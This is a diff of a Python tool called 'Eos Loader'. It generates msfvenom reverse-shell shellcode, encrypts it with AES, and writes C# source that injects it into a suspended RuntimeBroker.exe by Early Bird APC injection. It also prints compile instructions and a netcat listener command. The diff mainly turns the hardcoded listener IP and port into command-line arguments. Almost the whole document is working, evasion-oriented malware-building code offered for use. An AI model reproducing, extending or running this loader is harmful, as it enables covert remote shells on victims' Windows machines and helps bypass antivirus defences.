@@ -1,41 +1,43 @@
 #!/usr/bin/env python3
 import subprocess
 import sys
+import argparse
+import os
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from cryptography.hazmat.backends import default_backend
-import os
 
-LHOST = "10.10.15.170" # YOUR IP
-LPORT = 443 # YOUR PORT
-PAYLOAD = "windows/x64/shell_reverse_tcp" # shellcode from msfvenom
+def parse_args():
+    parser = argparse.ArgumentParser(description="Eos Loader - Early Bird APC Injection Generator")
+    parser.add_argument("--lhost", required=True, help="Listener IP address")
+    parser.add_argument("--lport", required=True, type=int, help="Listener port")
+    parser.add_argument("--payload", default="windows/x64/shell_reverse_tcp", help="msfvenom payload (default: windows/x64/shell_reverse_tcp)")
+    parser.add_argument("--target", default="C:\\\\Windows\\\\System32\\\\RuntimeBroker.exe", help="Sacrificial process path (default: RuntimeBroker.exe)")
+    parser.add_argument("--out", default="eos.cs", help="Output C# filename (default: eos.cs)")
+    return parser.parse_args()
 
-def generate_raw_shellcode():
-    cmd = ["msfvenom", "-p", PAYLOAD, f"LHOST={LHOST}", f"LPORT={LPORT}", "-f", "raw", "-o", "/dev/stdout"] # yes there's no user input filtering, i'm not going to accept cves, i simply don't care.
+def generate_raw_shellcode(payload, lhost, lport):
+    cmd = ["msfvenom", "-p", payload, f"LHOST={lhost}", f"LPORT={lport}", "-f", "raw", "-o", "/dev/stdout"]
     try:
-        return subprocess.run(cmd, capture_output=True, check=True).stdout
+        result = subprocess.run(cmd, capture_output=True, check=True)
+        return result.stdout
     except subprocess.CalledProcessError as e:
-        print(f"[!] msfvenom failed: {e}", file=sys.stderr)
+        print(f"[!] msfvenom failed: {e.stderr.decode()}", file=sys.stderr)
         sys.exit(1)
 
 def aes_encrypt(data):
     key = os.urandom(32)
     iv = os.urandom(16)
-    pad = 16 - (len(data) % 16)
-    data += bytes([pad]) * pad
     cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
     encryptor = cipher.encryptor()
+    pad = 16 - (len(data) % 16)
+    data += bytes([pad]) * pad
     return key, iv, encryptor.update(data) + encryptor.finalize()
 
-def format_csharp_byte_array(data):
+def fmt_cs_bytes(data):
     return "{" + ", ".join(f"0x{b:02x}" for b in data) + "}"
 
-def generate_csharp_runner(key, iv, encrypted_shellcode):
-    key_cs = format_csharp_byte_array(key)
-    iv_cs = format_csharp_byte_array(iv)
-    encrypted_cs = format_csharp_byte_array(encrypted_shellcode)
-
-    csharp_code = f'''
-using System;
+def generate_csharp(key, iv, encrypted_shellcode, target_process):
+    return f'''using System;
 using System.IO;
 using System.Runtime.InteropServices;
 using System.Security.Cryptography;
@@ -77,9 +79,9 @@ namespace EarlyBirdInjector
         }}
 
         public const uint CREATE_SUSPENDED = 0x00000004;
-        public const uint MEM_COMMIT = 0x1000;
-        public const uint MEM_RESERVE = 0x2000;
-        public const uint PAGE_READWRITE = 0x04;
+        public const uint MEM_COMMIT       = 0x1000;
+        public const uint MEM_RESERVE      = 0x2000;
+        public const uint PAGE_READWRITE   = 0x04;
         public const uint PAGE_EXECUTE_READ = 0x20;
 
         [DllImport("kernel32.dll", SetLastError = true)]
@@ -103,7 +105,7 @@ namespace EarlyBirdInjector
         [DllImport("kernel32.dll", SetLastError = true)]
         public static extern bool CloseHandle(IntPtr hObject);
 
-        static byte[] DecryptAes(byte[] encryptedData, byte[] key, byte[] iv)
+        static byte[] DecryptAes(byte[] data, byte[] key, byte[] iv)
         {{
             using (Aes aes = Aes.Create())
             {{
@@ -114,7 +116,7 @@ namespace EarlyBirdInjector
                 using (MemoryStream ms = new MemoryStream())
                 using (CryptoStream cs = new CryptoStream(ms, aes.CreateDecryptor(), CryptoStreamMode.Write))
                 {{
-                    cs.Write(encryptedData, 0, encryptedData.Length);
+                    cs.Write(data, 0, data.Length);
                     cs.FlushFinalBlock();
                     return ms.ToArray();
                 }}
@@ -123,19 +125,19 @@ namespace EarlyBirdInjector
 
         static void Main()
         {{
-            byte[] encrypted = {encrypted_cs};
-            byte[] key = {key_cs};
-            byte[] iv = {iv_cs};
-            byte[] buf = DecryptAes(encrypted, key, iv);
+            byte[] encrypted = {fmt_cs_bytes(encrypted_shellcode)};
+            byte[] key       = {fmt_cs_bytes(key)};
+            byte[] iv        = {fmt_cs_bytes(iv)};
+            byte[] buf       = DecryptAes(encrypted, key, iv);
 
             STARTUPINFO si = new STARTUPINFO();
             si.cb = (uint)Marshal.SizeOf(si);
             PROCESS_INFORMATION pi;
 
-            if (!CreateProcess(null, "C:\\\\Windows\\\\System32\\\\RuntimeBroker.exe", IntPtr.Zero, IntPtr.Zero, false, CREATE_SUSPENDED, IntPtr.Zero, null, ref si, out pi))
+            if (!CreateProcess(null, "{target_process}", IntPtr.Zero, IntPtr.Zero, false, CREATE_SUSPENDED, IntPtr.Zero, null, ref si, out pi))
                 return;
 
-            IntPtr baseAddr = IntPtr.Zero;
+            IntPtr baseAddr   = IntPtr.Zero;
             IntPtr regionSize = (IntPtr)buf.Length;
             NtAllocateVirtualMemory(pi.hProcess, ref baseAddr, IntPtr.Zero, ref regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 
@@ -158,16 +160,29 @@ namespace EarlyBirdInjector
     }}
 }}
 '''
-    return csharp_code
 
 if __name__ == "__main__":
-    raw = generate_raw_shellcode()
-    print(f"[+] Raw shellcode size: {len(raw)} bytes.")
+    args = parse_args()
+
+    print(f"[*] Payload  : {args.payload}")
+    print(f"[*] LHOST    : {args.lhost}")
+    print(f"[*] LPORT    : {args.lport}")
+    print(f"[*] Target   : {args.target}")
+    print(f"[*] Output   : {args.out}")
+    print()
+
+    raw = generate_raw_shellcode(args.payload, args.lhost, args.lport)
+    print(f"[+] Shellcode : {len(raw)} bytes")
+
     key, iv, enc = aes_encrypt(raw)
-    code = generate_csharp_runner(key, iv, enc)
-    with open("eos.cs", "w") as f:
+    print(f"[+] Encrypted : {len(enc)} bytes (AES-256-CBC)")
+
+    code = generate_csharp(key, iv, enc, args.target)
+    with open(args.out, "w") as f:
         f.write(code)
-    print("[+] C# source written to eos.cs")
-    print("[*] Compile as EXE (x64):")
-    print("    C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe /platform:x64 /unsafe /out:eos.exe eos.cs")
-    print("[*] Start listener IE: sudo nc -lvnp 443")
+    print(f"[+] C# source written to {args.out}")
+    print()
+    print("[*] Compile (x64, Windows):")
+    print(f"    C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe /platform:x64 /unsafe /out:eos.exe {args.out}")
+    print("[*] Start listener:")
+    print(f"    sudo nc -lvnp {args.lport}")
